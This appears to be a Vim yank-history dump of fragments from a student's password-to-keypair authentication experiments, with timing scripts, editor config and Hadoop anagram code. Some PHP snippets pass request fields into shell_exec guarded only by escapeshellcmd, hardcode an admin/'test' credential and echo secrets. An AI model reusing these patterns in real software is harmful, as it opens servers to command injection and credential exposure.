	  privateKey	[Variable]	12
	  privateKeyArray	[Variable]	11
	  hashArrayScrypt	[Variable]	8
	  hashScrypt	[Variable]	7
	  passEnc	[Variable]	6
	  encoder	[Variable]	3
	createKeyPairFromPassword	[Function]	2
ccc430fab42c0956feab12d83eed2331|list:/outline|5|1|V|list
	    hash512sliced.map() callback	[Function]	21
	    privateKeyArray.map() callback	[Function]	12
	    publicKeyByteArray.map() callback	[Function]	29
	  publicKeyPromise	[Variable]	26
	createKeyPairFromPassword	[Function]	2
3225b3f31e9d1442c7a12f46a8b3e0d0|list:/outline|5|1|V|list
	createKeyPairFromPassword	[Function]	2
	    hash512sliced.map() callback	[Function]	21
	    privateKeyArray.map() callback	[Function]	12
	    publicKeyByteArray.map() callback	[Function]	29
3ddbf53679fb61c09a2a484cd811c0ca|list:/outline|7|1|V|list
	  hashSha512	[Variable]	16
	  hashScrypt	[Variable]	7
	  hash512sliced	[Variable]	20
	  hashArraySha512	[Variable]	17
	  hashArrayScrypt	[Variable]	8
	    hash512sliced.map() callback	[Function]	21
	keypair.then() callback	[Function]	40
58f7417303a9e9190611bf3efc55f4bb|list:/outline|7|1|V|list
	  hashSha512	[Variable]	16
	  hashScrypt	[Variable]	7
	  hash512sliced	[Variable]	20
	  hashArraySha512	[Variable]	17
	  hashArrayScrypt	[Variable]	8
	    hash512sliced.map() callback	[Function]	21
59e51f351daf70fe6d30bf5ee1f9a43f|list:/outline|3|1|V|list
	  hashSha512	[Variable]	16
	  hashScrypt	[Variable]	7
	  hashArraySha512	[Variable]	17
	  hashArrayScrypt	[Variable]	8
	  hash512sliced	[Variable]	20
	    hash512sliced.map() callback	[Function]	21
dea66eaa4f8c974ecae4fe34cacabb75|list:/extensions|15|1|V|list
	* coc-yank	1.1.3	~/.config/coc/extensions/node_modules/coc-yank
	+ coc-ccls	0.0.5	~/.config/coc/extensions/node_modules/coc-ccls
	+ coc-java	1.4.6	~/.config/coc/extensions/node_modules/coc-java
	+ coc-json	1.2.4	~/.config/coc/extensions/node_modules/coc-json
	* coc-lists	1.3.6	~/.config/coc/extensions/node_modules/coc-lists
	* coc-pairs	1.2.20	~/.config/coc/extensions/node_modules/coc-pairs
	+ coc-phpls	2.1.7	~/.config/coc/extensions/node_modules/coc-phpls
	+ coc-python	1.2.7	~/.config/coc/extensions/node_modules/coc-python
	+ coc-texlab	1.9.9	~/.config/coc/extensions/node_modules/coc-texlab
	+ coc-vimtex	1.0.2	~/.config/coc/extensions/node_modules/coc-vimtex
	* coc-prettier	1.1.11	~/.config/coc/extensions/node_modules/coc-prettier
	* coc-snippets	2.1.18	~/.config/coc/extensions/node_modules/coc-snippets
	* coc-tsserver	1.4.9	~/.config/coc/extensions/node_modules/coc-tsserver
	* coc-highlight	1.2.5	~/.config/coc/extensions/node_modules/coc-highlight
c793fb08d36c8c628246f760e8340145|file:///home/neo/Documents/diplomatiki/create-keypair.js|5|1|V|javascript
	    for
805b2d42d9fe44340c8a4b933a36cce3|file:///home/neo/Documents/diplomatiki/create-keypair.js|5|1|V|javascript
	    i//Get scrypt hash of password
6ad4aa4d88ab7805b530dd988d4bdf19|file:///home/neo/Documents/diplomatiki/create-keypair.js|10|1|V|javascript
	    if
f309001ec6b07194eb26b5a32ad80c29|file:///home/neo/Documents/diplomatiki/create-keypair.js|16|1|V|javascript
	    ife
4e18a8335ca99ce9bd3f665250578113|file:///home/neo/.vimrc|226|1|V|vim
	nnoremap <C-w>e :SyntasticCheck<CR> :SyntasticToggleMode<CR>
c4900c1342e0989d8ddeebc42b83be4d|file:///home/neo/.vimrc|227|18|v|vim
	SyntasticCheck
b8c0fbe5ed21894f3fce70cb4f083c6f|file:///home/neo/.vimrc|227|30|v|vim
	SyntasticToggleMode
fcfb92b7a5bb120ff314d99ce9b51edb|file:///home/neo/.vimrc|228|1|V|vim
	nnoremap <C-w>l :lclose<CR> :lopen<CR>
060bf2d587991d8f090a1309b285291c|file:///home/neo/.vimrc|227|27|v|vim
	Check
ae601faa916217926d60f45f6f082e13|file:///home/neo/.vimrc|226|36|v|vim
	 :SyntasticToggleMode<CR>
c90caf6993c279505b1607146817b811|file:///home/neo/.vimrc|42|27|v|vim
	<CR>
77251263743bf8589dd1d8be4200fffb|file:///home/neo/.local/bin/compiler|9|1|V|sh
	if [ $# -gt 2 ]; then
ca53f700a4636d0f5c98ef959af67ac3|file:///home/neo/.local/bin/compiler|10|3|v|sh
	entlist
c462067a6bc06af4962cb7070881631e|file:///home/neo/.vimrc|42|1|V|vim
	map <leader>c :!compiler %<CR>
8e17458b5b6cb85d1a4b0f7d516c0654|file:///home/neo/Documents/diplomatiki/javascript-files/scrypt.py|21|1|V|python
	nacl.encoding.encode(encoder=nacl.encoding.HexEncoder)
cdcebc7a5a0d465603b07da99db61247|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|21|22|v|php
	 ["admin" => "test"], ];
21232f297a57a5a743894a0e4a801fc3|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|22|21|v|php
	admin
df0a5f65c8a3519cfc74b3c61d3e673c|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|25|5|V|php
	    echo $password_array["admin"];
47a652a758c53488d5f7b9a1c39d8d1a|file:///home/neo/Documents/diplomatiki/javascript-files/scrypt.py|22|47|v|python
	f for
6d5bc17df1abcb49aa0fdf1664824c34|file:///home/neo/Documents/diplomatiki/javascript-files/scrypt.py|22|59|v|python
	ch in line
7b206ac3b72a5f20b4a997c2263f46f9|file:///home/neo/Documents/diplomatiki/javascript-files/scrypt.py|22|42|v|python
	  for line in SCRYPT_HASH
098f6bcd4621d373cade4e832627b4f6|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|22|21|v|php
	test
acd30ba34ddde909d8120855114cd618|file:///home/neo/.vimrc|43|28|v|vim
	<space> 
0e8052d5123cb63770f93bf135c0ea29|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|8|V|php
	        echo "Logged in with password";
7bb0edd98f22430a03b67f853e83c2ca|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|33|8|V|php
	        
df43f3230d65e09d26435fc250ba386f|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|37|1|V|php
	        $command = escapeshellcmd("/usr/bin/python2.7 /opt/lampp/htdocs/verify.py $public_key $message $signature");
	        $output = shell_exec($command);
e8418d1d706cd73548f9f16f1d55ad6e|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|33|73|v|php
	verify
a218ae3ca48eb6f51ccdef0cb5d6c8cc|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|33|83|v|php
	$public_key $message $signature
55cd144ae92bef0e2eadea1d761876d8|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|25|5|V|php
	    echo $password_arrayadmin;
c57dfcb72bf3ce9e0235721362f77db1|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|37|12|V|php
	           echo  
bc95dfc14146aa23e43f2ea7af04d310|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|37|9|V|php
	            
71a75b229d91c4e83eed6ee58483b080|file:///home/neo/Documents/diplomatiki/javascript-files/scrypt.py|21|1|V|python
	# print(SCRYPT_HASH)
e7becc33b2fbe0254beb2dbf0ac7658a|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|1|V|php
	        $output = shell_exec($command);
	        $toCheck = $password_array("$username");
1c6240db07ef727c6529b2a9af0016f0|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|32|1|V|php
	    echo $username;
62c3ca21dd5801264d516229a1f153ae|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|35|v|php
	"$username"
5f4dcc3b5aa765d61d8327deb882cf99|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|15|v|php
	password
9f3eb8b11a3f171bbc135312729d7cc5|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|36|9|V|php
	        echo $output;
f563bb33574db762a177480153080603|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|33|36|v|php
	/usr/bin/python2.7 /opt/lampp/htdocs/scrypt.py $password
1072475557282d7c178317b30a5744f0|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|22|21|v|php
	fa4daebce76f9f5d5980d4219a039de33a151f19d197bb4d6c54846504b65d144e331feb8bd3234b38c52e152ab8fd03a7a50819c989de9c31d61eff1908bd9a
78d5d5a285a3dda33b2a1a76447385c3|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|22|1|V|php
	        'admin' => '',
c427b6abf2484dff507b9a382313c893|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|9|V|php
	        echo $command;
a14841387fbfb45c820e524ef5f08d23|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|37|9|V|php
	        echo $toCheck;
38a054df0956f8e7c0980113831a78e6|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|36|14|v|php
	$toCheck
b45cffe084dd3d20d928bee85e7b0f21|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|35|10|v|php
	string
fbeec21c52b5bac8ced56dd2bf200e17|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|39|9|V|php
	        echo strcmp($output, $toCheck);
06b394fa9fd0395a83e36af01deec317|file:///home/neo/Documents/diplomatiki/javascript-files/index.php|37|9|V|php
	        echo $output;
	        echo $toCheck;
c89531a6a4324e65914298ea34d33143|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|19|1|V|javascript
	    let t0 = performance.now();
11c342b971d87804f22d7b6e33b79132|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|23|21|v|javascript
	"Elaps
964fc2ea002052a309b0b75a11ce9564|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|23|21|v|javascript
	ed POST time:"
1cfa9d80bec8e34ec3ed00e66296ccbe|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|20|1|V|javascript
	    let t0 = performance.now();
		let password = document.getElementById("passwd").value;
	    let username = document.getElementById("username").value;
	    submitPassword(username, password).then( () =>{
	        let t1 = performance.now();
	        let elapsed = t1-t0;
	        console.log(elapsed);
	    }
	    );
5eb3a6f4bc05bd5090cde671099a6b81|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|26|1|V|javascript
	// }
0437ca2d0435345756089f1824e794b1|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|17|1|V|javascript
	// for (let i = 0; i < 1000; i++){
64e2750c2ce8259e0094b571f2319b82|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|34|1|V|javascript
	    // submitPassword(username, password).then( () =>{
db9a0d2b2e46bebfe0b8cb3e7ba8148f|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|27|5|V|javascript
	    console.log("Test");
a3c149391ffc055dbab3d968689307d6|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|41|39|v|javascript
	totalTime
bf45cc191d9840cb8493576ce52dfbff|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|26|5|V|javascript
	    console.log(elapsed);
d81a255108511307a5ab34d9c41096ac|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|35|1|V|javascript
	    // submitPassword(username, password).then( () =>{
	    //     let t1 = performance.now();
	    //     let elapsed = t1-t0;
	    //     console.log(elapsed);
	    // });
434977ae8f77b5b5ba5dd99f1de72227|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|17|1|V|javascript
	async function timePost(username, password) {
	  let totalTime = 0;
	  let t0, t1, elapsed;
	  let repeats = 1000;
	  for (let i = 0; i < repeats; i++) {
	    t0 = performance.now();
	    await submitPassword(username, password);
	    t1 = performance.now();
	    elapsed = t1 - t0;
	    totalTime += elapsed;
	  }
	  return Promise.resolve(totalTime/repeats);
	}
7bdecee2cca528d5b72eccb727915919|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|33|11|v|javascript
	submitPassword(username, password
117995adf63e0283a85f28624881414e|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|33|11|v|javascript
	submitPassword
cc42f5057ff7c4192251517ae5d669aa|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|35|1|V|javascript
	    timePost(username, password).then(avgTime => console.log(avgTime));
691cf7fc1c18ce370ecae5cac58cf9d5|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|46|1|V|javascript
	    let t0 = performance.now();
	    createAndSign(username, password).then( () =>{
	        let t1 = performance.now();
	        let elapsed = t1-t0;
	        console.log("Elapsed POST time:", elapsed);
	    }
b6ed383feb7e26e4451ea7fe084bc7e3|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|46|5|V|javascript
	    );
16508d13d70b1c99aa7a70d615a1cd8e|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|1|1|V|javascript
	async function createAndSign(username, password){
	    // let start = performance.now();
		const message = "af82";
		let keypair = await createKeyPairFromPassword(password);
		let public_key = keypair.substr(64,128);
	    let signedMessageBytes = await signMessage(keypair, message);
	    let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	    let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
	    // let end = performance.now ();
	    // let elapsedTime = end - start;
	    // console.log("Elapsed create signature time: ", elapsedTime);
	    let postResult = Promise.resolve(
	        $.post("http://localhost:80/index.php",
	            {
	                'username': username, 
	                'public_key': public_key,
	                'message': message,
	                'signature': signature,
	            },
	            function(data){
	                // console.log(data);
	            })
	    );    
	    return postResult;
	}
	
	async function timePost(username, password) {
	  let totalTime = 0;
	  let t0, t1, elapsed;
	  let repeats = 1000;
	  for (let i = 0; i < repeats; i++) {
	    t0 = performance.now();
	    await createAndSign(username, password);
	    t1 = performance.now();
	    elapsed = t1 - t0;
	    totalTime += elapsed;
	  }
	  return Promise.resolve(totalTime/repeats);
	}
	
	$(document).ready(function(){
	  $("button").click(function(){
		let password = document.getElementById("passwd").value;
	    let username = document.getElementById("username").value;
	    timePost(username, password).then(avgTime => console.log(avgTime));
	  });
	});
840f82180ddd072dc9efdf8ac9685e48|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|28|1|V|javascript
	async function timePost(username, password) {
	  let totalTime = 0;
	  let t0, t1, elapsed;
	  let repeats = 1000;
	  for (let i = 0; i < repeats; i++) {
	    t0 = performance.now();
	    await createAndSign(username, password);
	    t1 = performance.now();
	    elapsed = t1 - t0;
	    totalTime += elapsed;
	  }
	  return Promise.resolve(totalTime/repeats);
	}
654431ff24d7c135ff130a6fe1178806|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|32|5|v|javascript
	timePost
23b19d58396179b01f0214f8e3c95a89|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|32|5|v|javascript
	createKeyPairFromPassword
913229ddbef35c7c03cfe9e3535b68e6|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|13|1|V|javascript
	    let postResult = Promise.resolve(
	        $.post("http://localhost:80/index.php",
	            {
	                'username': username, 
	                'public_key': public_key,
	                'message': message,
	                'signature': signature,
	            },
	            function(data){
	                // console.log(data);
	            })
3310eb83f6baf9a01a3102429bf1efa2|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|13|5|V|javascript
	    );    
ce8eb1ea2de3e427c347601217a6a3f4|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|6|1|V|javascript
	    let start = performance.now();
		const message = "af82";
		let keypair = await createKeyPairFromPassword(password);
		let public_key = keypair.substr(64,128);
	    let signedMessageBytes = await signMessage(keypair, message);
	    let signedMessageArray = Array.from(new Uint8Array(signedMessageBytes));
	    let signature = signedMessageArray.map(b => b.toString(16).padStart(2, '0')).join('');
	    let end = performance.now ();
	    let elapsedTime = end - start;
	    console.log("Elapsed create signature time: ", elapsedTime);
b7b530e169f45c731ed327198d8b690b|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|5|9|v|javascript
	let 
5e9511490a736b182981fea2933f5362|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|13|9|V|javascript
	        elapsedTime = end - start;
43663c1d6693aba6b5753d5fa455343b|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|14|9|V|javascript
	        console.log("Elapsed create signature time: ", elapsedTime);
a9b7ba70783b617e9998dc4dd82eb3c5|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|6|25|v|javascript
	1000
c6bce09246855c91c163008df01d3eb0|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|2|1|V|javascript
	    // let start = performance.now();
a1a19e720f08f0b0720a24512118274d|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|8|5|V|javascript
	    // let end = performance.now ();
	    // let elapsedTime = end - start;
	    // console.log("Elapsed create signature time: ", elapsedTime);
a8ee13d50f10d86488af643e3a8349fc|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|18|12|v|javascript
	postResult
6de9bfc0e01ccad53f76bc644cd657e8|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|18|12|v|javascript
	postResulo
30d90fc6fd2d6fe045680b994ccbe733|file:///home/neo/Documents/diplomatiki/javascript-files/keypair-only.html|8|41|v|html
	time-signature.js
aa8045630f7d1068c940a36da25188c2|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature-only.js|23|7|V|javascript
	      console.log("Test");
ba672fee5578963da7f043b37ec135be|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|33|5|V|javascript
	    console.log("test")
f78bcdda2119566b0e41513533f78e02|file:///home/neo/Documents/diplomatiki/javascript-files/timings.txt|1|1|v|text
	Scrypt parameters (both on scrypt hash storage when using password only and when used as seed for keypair):
b06c87468a77fa9730bd3a03e0f74fd4|file:///home/neo/Documents/diplomatiki/javascript-files/timings.txt|5|29|v|text
	267 ms
43ae79a653686992ae90e100340624dd|file:///home/neo/.config/polybar/config|62|28|v|
	xbacklight 
b326b5062b2f0e69046810717534cb09|file:///home/neo/Documents/diplomatiki/cryptotest.js|3|50|v|javascript
	true
3e1a083156aa112ee000f37d2008e9ff|file:///home/neo/.config/coc/ultisnips/javascript.snippets|12|1|V|snippets
	# let g:ultisnips_javascript = {
	#      \ 'keyword-spacing': 'always',
	#      \ 'semi': 'never',
	#      \ 'space-before-function-paren': 'always',
	#      \ }
4dd7c28f06e3bc9d7cc0bc17eb9f352c|file:///home/neo/Documents/diplomatiki/cryptotest.js|2|1|V|javascript
	ifTraceback (most recent call last):
	  File "<string>", line 3, in <module>
	    A
	NameError: name 'keyword_spacing' is not defined(true) {
	    
	}
1e046e469997891cf633a738e6e1237e|untitled:1|1|1|V|
	import java.io.IOException;
	import java.util.*;
	        
	import org.apache.hadoop.fs.Path;
	import org.apache.hadoop.conf.*;
	import org.apache.hadoop.io.*;
	import org.apache.hadoop.mapreduce.*;
	import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;
	import org.apache.hadoop.mapreduce.lib.input.TextInputFormat;
	import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;
	import org.apache.hadoop.mapreduce.lib.output.TextOutputFormat;
	        
	public class WordCount {
	
	 public static class Map extends Mapper<LongWritable, Text, Text, Text> {
	    private Text sortedWord = new Text();
	    private Text wordText = new Text();
	
	
	     public void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException {
	        String line = value.toString();
	        StringTokenizer tokenizer = new StringTokenizer(line);
	
	        while (tokenizer.hasMoreTokens()) {
	            String word = tokenizer.nextToken();
	            char[] wordArray = word.toCharArray();
	            Arrays.sort(wordArray);
	            sortedWord.set(new String(wordArray));
	            wordText.set(word);
	            context.write(sortedWord, wordText);
	        }
	    }
	 }
	        
	 public static class Reduce extends Reducer<Text, Text, Text, Text> {
	
	     private Text words = new Text();
	     private StringBuilder wordsBuilder = new StringBuilder();
	    public void reduce(Text key, Iterable<Text> values, Context context)
	      throws IOException, InterruptedException {
	        for (Text val : values) {
	            wordsBuilder.append(val.toString());
	            wordsBuilder.append(",");
	        }
	        String wordsStr = wordsBuilder.toString();
	        words.set(wordsStr);
	        context.write(key, words);
	    }
	 }
	
	
	
	    public static void main(String[] args) throws Exception {
	    Configuration conf = new Configuration();
	        
	    Job job = Job.getInstance(conf, "wordcount");
	    job.setJarByClass(WordCount.class);
	    
	    job.setOutputKeyClass(Text.class);
	    job.setOutputValueClass(HashSet.class);
	        
	    job.setMapperClass(Map.class);
	    job.setCombinerClass(Reduce.class);
	    job.setReducerClass(Reduce.class);
	        
	    job.setInputFormatClass(TextInputFormat.class);
	    job.setOutputFormatClass(TextOutputFormat.class);
	
	    FileInputFormat.addInputPath(job, new Path("input"));
	    FileOutputFormat.setOutputPath(job, new Path("output"));
	    
	    System.exit(job.waitForCompletion(true) ? 0 : 1);
	 }
	        
	}
f5623a32c4c5bbe7d2f06750dfd7b79e|untitled:1|2|1|V|
	import java.io.IOException;
	import java.util.*;
	
	import org.apache.hadoop.fs.Path;
	import org.apache.hadoop.conf.*;
	import org.apache.hadoop.io.*;
	import org.apache.hadoop.mapreduce.*;
	import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;
	import org.apache.hadoop.mapreduce.lib.input.TextInputFormat;
	import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;
	import org.apache.hadoop.mapreduce.lib.output.TextOutputFormat;
8ecce60677a98d5127c6505bd65df4c2|untitled:1|5|1|v|
	import org.apache.hadoop.fs.Path;
f7dcfacf3ebeb5b16e46572460fc83f9|untitled:1|5|1|V|
	import org.apache.hadoop.fs.Path;
	import org.apache.hadoop.conf.*;
	import org.apache.hadoop.io.*;
	import org.apache.hadoop.mapreduce.*;
	import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;
	import org.apache.hadoop.mapreduce.lib.input.TextInputFormat;
	import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;
	import org.apache.hadoop.mapreduce.lib.output.TextOutputFormat;
	
686854113c06bbeb709fd03ce3aaf36d|untitled:1|58|1|V|
	        Configuration conf = new Configuration();
	
	        Job job = Job.getInstance(conf, "wordcount");
	        job.setJarByClass(WordCount.class);
	
	        job.setOutputKeyClass(Text.class);
	        job.setOutputValueClass(Text.class);
	
	        job.setMapperClass(Map.class);
	        job.setCombinerClass(Reduce.class);
	        job.setReducerClass(Reduce.class);
	
	        job.setInputFormatClass(TextInputFormat.class);
	        job.setOutputFormatClass(TextOutputFormat.class);
	
	        FileInputFormat.addInputPath(job, new Path("input"));
	        FileOutputFormat.setOutputPath(job, new Path("output"));
	
	        System.exit(job.waitForCompletion(true) ? 0 : 1);
957fa1ada23701d44a2cf22c96b400a6|untitled:1|21|1|V|
	            String line = value.toString().replaceAll("[^a-zA-Z ]", "").toLowerCase();
	            StringTokenizer tokenizer = new StringTokenizer(line);
	
	            while (tokenizer.hasMoreTokens()) {
f9f2ddc810a9c5181e78391283300ef5|untitled:1|1|1|V|
	
	import java.io.IOException;
	import java.util.*;
	
	import org.apache.hadoop.fs.Path;
	import org.apache.hadoop.conf.*;
	import org.apache.hadoop.io.*;
	import org.apache.hadoop.mapreduce.*;
	import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;
	import org.apache.hadoop.mapreduce.lib.input.TextInputFormat;
	import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;
	import org.apache.hadoop.mapreduce.lib.output.TextOutputFormat;
	
	public class WordCount {
	
	    public static class Map extends Mapper<LongWritable, Text, Text, Text> {
	        private Text sortedWord = new Text();
	        private Text wordText = new Text();
	
	        public void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException {
	            String line = value.toString().replaceAll("[^a-zA-Z ]", "").toLowerCase();
	            StringTokenizer tokenizer = new StringTokenizer(line);
	
	            while (tokenizer.hasMoreTokens()) {
	                String word = tokenizer.nextToken();
	                char[] wordArray = word.toCharArray();
	                Arrays.sort(wordArray);
	                sortedWord.set(new String(wordArray));
	                wordText.set(word);
	                context.write(sortedWord, wordText);
	            }
	        }
	    }
	
	    public static class Reduce extends Reducer<Text, Text, Text, Text> {
	
	        private Text words = new Text();
	        private StringBuilder wordsBuilder = new StringBuilder();
	        private Set<Text> uniqueWords = new HashSet<>();
	
	        public void reduce(Text key, Iterable<Text> values, Context context)
	                throws IOException, InterruptedException {
	            for (Text val : values) {
	                if (uniqueWords.add(val)){
	                    wordsBuilder.append(val.toString());
	                    wordsBuilder.append(",");
	                }
	            }
	            String wordsStr = wordsBuilder.toString();
	            words.set(wordsStr);
	            context.write(key, words);
	        }
	    }
	
	
	
	    public static void main(String[] args) throws Exception {
	        Configuration conf = new Configuration();
	
	        Job job = Job.getInstance(conf, "wordcount");
	        job.setJarByClass(WordCount.class);
	
	        job.setOutputKeyClass(Text.class);
	        job.setOutputValueClass(Text.class);
	
	        job.setMapperClass(Map.class);
	        job.setCombinerClass(Reduce.class);
	        job.setReducerClass(Reduce.class);
	
	        job.setInputFormatClass(TextInputFormat.class);
	        job.setOutputFormatClass(TextOutputFormat.class);
	
	        FileInputFormat.addInputPath(job, new Path("input"));
	        FileOutputFormat.setOutputPath(job, new Path("output"));
	
	        System.exit(job.waitForCompletion(true) ? 0 : 1);
	    }
	
	}
421aa90e079fa326b6494f812ad13e79|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|4|15|v|javascript
	localhost
3d5305fe55c229ebef6b2efe5c915160|file:///home/neo/Documents/diplomatiki/javascript-files/time-signature.js|9|23|V|javascript
	    // let t1 = performance.now();
	    // console.log(t1 - t0);
3320c6cccb2f881e3a275268dcd0e2e6|file:///home/neo/IdeaProjects/hadoop_test/src/main/java/Anagram.java|1|1|V|java
	
	import java.io.IOException;
	import java.util.*;
	
	import org.apache.hadoop.fs.Path;
	import org.apache.hadoop.conf.*;
	import org.apache.hadoop.io.*;
	import org.apache.hadoop.mapreduce.*;
	import org.apache.hadoop.mapreduce.lib.input.FileInputFormat;
	import org.apache.hadoop.mapreduce.lib.input.TextInputFormat;
	import org.apache.hadoop.mapreduce.lib.output.FileOutputFormat;
	import org.apache.hadoop.mapreduce.lib.output.TextOutputFormat;
	
	public class Anagram {
	
	    public static class Map extends Mapper<LongWritable, Text, Text, Text> {
	        private Text sortedWord = new Text();
	        private Text wordText = new Text();
	
	        public void map(LongWritable key, Text value, Context context) throws IOException, InterruptedException {
	            String line = value.toString().replaceAll("[^a-zA-Z ]", "").toLowerCase();
	            StringTokenizer tokenizer = new StringTokenizer(line);
	
	            while (tokenizer.hasMoreTokens()) {
	                String word = tokenizer.nextToken();
	                char[] wordArray = word.toCharArray();
	                Arrays.sort(wordArray);
	                String wordStr = new String(wordArray);
	                sortedWord.set(wordStr);
	//                System.out.println("Key: "+ wordStr);
	//                System.out.println("Value: "+ word);
	                wordText.set(word);
	                context.write(sortedWord, wordText);
	            }
	        }
	    }
	
	    public static class Reduce extends Reducer<Text, Text, Text, Text> {
	
	        private Text words = new Text();
	        private StringBuilder wordsBuilder = new StringBuilder();
	        private Set<Text> uniqueWords = new HashSet<>();
	
	        public void reduce(Text key, Iterable<Text> values, Context context)
	                throws IOException, InterruptedException {
	
	            System.out.println("Key: " + key.toString());
	            int size = 0;
	            for (Text val : values) {
	                if (uniqueWords.add(val)){
	                    System.out.println("Value: " + val.toString());
	                    size++;
	                    wordsBuilder.append(val.toString());
	                    wordsBuilder.append(" ");
	                }
	            }
	//            if (size > 1){
	                String wordsStr = wordsBuilder.toString();
	                words.set(wordsStr);
	                context.write(key, words);
	//            }
	
	        }
	    }
	
	
	
	    public static void main(String[] args) throws Exception {
	        Configuration conf = new Configuration();
	
	        Job job = Job.getInstance(conf, "anagram");
	        job.setJarByClass(Anagram.class);
	
	        job.setOutputKeyClass(Text.class);
	        job.setOutputValueClass(Text.class);
	
	        job.setMapperClass(Map.class);
	        job.setCombinerClass(Reduce.class);
	        job.setReducerClass(Reduce.class);
	
	        job.setInputFormatClass(TextInputFormat.class);
	        job.setOutputFormatClass(TextOutputFormat.class);
	
	        FileInputFormat.addInputPath(job, new Path("input"));
	        FileOutputFormat.setOutputPath(job, new Path("output"));
	
	        System.exit(job.waitForCompletion(true) ? 0 : 1);
	    }
	
	}
395b58b8e9fd64b6f41b9823de37c614|file:///home/neo/Documents/diplomatiki/javascript-files/time-password.js|4|15|v|javascript
	10.16.20.23:80
addb82a9db13d66f21584a33675c92a5|file:///home/neo/.config/i3/scripts/lock_rick.sh|10|60|v|sh
	meditate
58659562c351d0db64b84fd269532cd3|file:///home/neo/.config/i3/scripts/lock_rick.sh|10|1|V|sh
	convert -resize ~/.conch
d683825b1af8e74469bdbddda00a281b|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|1|1|V|javascript
	function hexToBytes(hex) {
	  for (var bytes = [], c = 0; c < hex.length; c += 2)
	    bytes.push(parseInt(hex.substr(c, 2), 16));
	  return bytes;
	}
c1c425268e68385d1ab5074c17a94f14|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|3|5|v|javascript
	function
5e3c7afc2257d529df8080ee4234de89|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|3|28|v|javascript
	on(hex) {
42c3cd1d596a4ce9ce7dae27f883f1e4|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|3|1|V|javascript
	    let hexToBytes = function(hex) {
	      for (let bytes = [], c = 0; c < hex.length; c += 2)
	        bytes.push(parseInt(hex.substr(c, 2), 16));
	      return bytes;
	    }
	    
1072edf0d0ed6864740700e9a3972415|file:///home/neo/Documents/diplomatiki/javascript-files/auth.js|15|9|V|javascript
	        return;
7393a267871ba9eee0d3a3998e751b84|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|7|1|V|javascript
	async function createKeyPairFromPassword(password) {
	  const encoder = new TextEncoder();
	
f8f0add5d47c69be66a4fd53ea8c0424|file:///home/neo/Documents/diplomatiki/javascript-files/create-keypair.js|7|1|V|javascript
